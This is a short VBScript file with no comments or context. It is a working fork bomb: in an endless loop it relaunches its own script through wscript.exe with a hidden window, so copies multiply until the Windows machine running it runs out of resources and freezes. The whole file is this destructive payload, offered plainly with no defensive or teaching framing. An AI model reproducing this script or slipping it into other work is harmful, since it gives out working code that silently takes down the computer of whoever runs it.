Set objShell = CreateObject("WScript.Shell")
Do
    objShell.Run "wscript.exe " & Chr(34) & WScript.ScriptFullName & Chr(34), 0, False
Loop
